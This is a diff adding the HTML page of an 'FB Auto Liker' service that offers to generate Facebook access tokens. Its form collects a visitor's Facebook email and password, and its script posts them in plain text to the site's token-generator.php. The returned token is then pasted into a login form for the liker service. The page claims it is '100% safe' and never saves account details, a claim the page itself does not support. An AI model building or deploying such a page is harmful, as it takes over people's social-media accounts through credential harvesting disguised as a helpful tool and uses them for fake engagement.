@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="description" content="Get facebook access token easily using our tool. Our tool is 100% safe we naver save user account detail.">
+<meta name="keywords" content="facebook acess token, get access token">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Access Token - FB Auto Liker</title>
+
+<link rel="icon" href="https://www.fbautoliker.co/img/favicon/favicon.ico">
+<link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,400italic" rel="stylesheet" type="text/css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-browser/0.1.0/jquery.browser.min.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script type="56a69dd333d7e1b907ea50e6-text/javascript">
+      if ( window.jQBrowser.mobile && top.location != location) top.location.href = document.location.href;
+   </script>
+<link rel="stylesheet" href="https://www.fbautoliker.co/css/styles.css" id="stylescss">
+<link rel="stylesheet" href="https://www.fbautoliker.co/css/theme-a.css">
+<!--[if lt IE 9]><script src="https://www.fbautoliker.co/js/html5shiv.js"></script><script src="https://www.fbautoliker.co/js/respond.min.js"></script><![endif]-->
+</head>
+<body>
+
+<header id="header" class="header novideo">
+
+<div class="navbar navbar-default navbar-fixed-top navbar-sticky">
+<div class="container">
+<div class="navbar-header">
+<button type="button" data-toggle="collapse" data-target="#navbar-main" class="navbar-toggle">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button>
+<a href="#" class="navbar-brand">
+<img src="img/logo2.png" alt="official liker logo">
+</a>
+</div>
+
+<div id="navbar-main" class="navbar-collapse collapse">
+<ul class="nav navbar-nav navbar-right main-navbar">
+<li><a href="/">Home</a>
+</li>
+<li><a href="/how-to-use">How To Use</a>
+</li>
+<li><a href="/access-token">Access Token</a>
+</li>
+<li><a href="/privacy-policy">Privacy Policy</a>
+</li>
+<li><a href="/contact">Contact</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</header>
+<div class="container text-center">
+<h1 class="pagehead">
+Access Token
+</h1>
+<div class="pagedescrptText">
+<p>If you are new to this website and don't know how to genrate facebook access token then first you should visit <a href="/how-to-use">how to use</a> page.</p>
+</div>
+<div class=" panel-heading adheight">
+
+</div>
+<div class="row">
+<div class="col-lg-12 panel">
+<div class=" panel-heading">
+<br>
+<iframe data-aa="1244812" src="//ad.a-ads.com/1244812?size=320x50" scrolling="no" style="width:320px; height:50px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe>
+<script type="56a69dd333d7e1b907ea50e6-text/javascript">
+	atOptions = {
+		'key' : 'd93f66755be97e51d524ff6d1412a654',
+		'format' : 'iframe',
+		'height' : 50,
+		'width' : 320,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.bcloudhost.com/d93f66755be97e51d524ff6d1412a654/invoke.js"></scr' + 'ipt>');
+</script>
+</div>
+<div class="panel-body ">
+<div class="col-md-4">
+</div>
+<div class="col-md-4">
+<div class="form-group">
+<input type="text" id="email" required="" class="form-control" placeholder="Enter Facebook Email/Number"><br>
+<input type="password" id="password" required="" class="form-control" placeholder="Enter Facebook Password"><br>
+<button type="button" id="generatebtn" onclick="if (!window.__cfRLUnblockHandlers) return false; generatAccess();" class="btn btn-theme btn-block btn-square" data-cf-modified-56a69dd333d7e1b907ea50e6-="">Generate Access Token</button>
+</div>
+</div>
+<div class="col-md-4">
+</div>
+<div class="col-md-12">
+
+</div>
+</div>
+<div class="panel-footer">
+<div class="form-group text-center" id="result_load" style="display:none">
+<button onclick="if (!window.__cfRLUnblockHandlers) return false; againGen()" class="btn btn-danger" data-cf-modified-56a69dd333d7e1b907ea50e6-="">Generate Again</button>
+<br>
+<label for="result"><center>Access Token Below</center></label>
+<li id="formid" class="list-group-item"> </li></p>
+<br>
+<div class="row">
+<div class="col-lg-12 panel">
+<div class=" panel-heading">
+<span>Paste Copied Text Here</span>
+</div>
+<div class="panel-body">
+<form method="post" rol="form" action="sign-in.php">
+<div id="custom-search-input">
+<div class="input-group col-md-12">
+<input type="text" name="token" autocomplete="off" required="Paste Copied Token Here" class="btn-square loginText input-lg form-control inputlogin" placeholder="Enter Your Access Token To Login">
+<span class="input-group-btn">
+<button class="btn btn-info btn-square btn-lg loginBtn" type="submit"><i class="fa fa-sign-in" aria-hidden="true"></i> Login</button>
+</span>
+</div>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+<img id="imgex" src="/img/facebook-access-token-example-picture.png" class="img-responsive" alt="Facebook Access Token" width="100%" />
+</div>
+</div>
+</div>
+</div>
+<section id="contact" class="contact">
+<div class="container">
+
+
+<ul class="list-icons">
+<li>
+<a href="">
+<em class="fa fa-twitter-square"></em>
+</a>
+</li>
+<li>
+<a href="https://web.facebook.com//">
+<em class="fa fa-facebook-square"></em>
+</a>
+</li>
+<li>
+<a href="https://plus.google.com/">
+<em class="fa fa-google-plus-square"></em>
+</a>
+</li>
+<li>
+<a href="">
+<em class="fa fa-instagram"></em>
+</a>
+</li>
+<li>
+<a href="">
+<em class="fa fa-flickr"></em>
+</a>
+</li>
+<li>
+<a href="">
+<em class="fa fa-pinterest-square"></em>
+</a>
+</li>
+</ul>
+<div class="text-center">
+
+</div>
+</div>
+</section>
+
+<footer id="footer">
+<div class="container">
+<div class="row">
+<div class="col-sm-6">
+<ul class="footer-nav">
+<li><a href="/" class="scrollto">Home</a>
+</li>
+<li><a href="/blog" class="=">Blog</a>
+</li>
+<li><a href="/about" class="">About</a>
+</li>
+<li><a href="/terms" class="">Terms</a>
+</li>
+</ul>
+</div>
+<div class="col-sm-6">
+
+<p class="copyright">FB Auto Liker &copy; 2020</p>
+</div>
+</div>
+</div>
+</footer>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script src="https://www.fbautoliker.co/vendor/jquery.browser/dist/jquery.browser.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script src="https://www.fbautoliker.co/vendor/jquery.easing/js/jquery.easing.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script src="https://www.fbautoliker.co/vendor/waitForImages/dist/jquery.waitforimages.min.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script src="https://www.fbautoliker.co/vendor/smoothscroll/smoothscroll.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>\
+<script src="https://www.fbautoliker.co/vendor/jquery.scrollTo/jquery.scrollTo.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+
+<script src="https://www.fbautoliker.co/js/scripts.js" type="56a69dd333d7e1b907ea50e6-text/javascript"></script>
+<script type="56a69dd333d7e1b907ea50e6-text/javascript">
+function generatAccess() {
+var load = "<i class='fa fa-circle-o-notch fa-spin'></i> Processing";
+   document.getElementById("generatebtn").innerHTML = load;
+         $("#generatebtn").attr('disabled', 'disabled');
+           document.getElementById("imgex").style.display = "none";
+
+var http = new XMLHttpRequest();
+var email = document.getElementById("email").value;
+var password = document.getElementById("password").value;
+var url = "./token-generator.php";
+var params = "email="+email+"&password="+password+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("formid").innerHTML = http.responseText; 
+      document.getElementById("result_load").style.display = "block";
+            $("#loginForm").addClass('hide');
+      document.getElementById("generatebtn").innerHTML = "Generate Token Again";
+         $("#generatebtn").removeAttr('disabled');
+
+    }
+}
+http.send(params);
+}
+function againGen()
+{
+	$("#loginForm").removeClass('hide');
+	           document.getElementById("result_load").style.display = "none";
+           document.getElementById("imgex").style.display = "block";
+
+}
+</script>
+<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="56a69dd333d7e1b907ea50e6-|49" defer=""></script></body>
+</html>
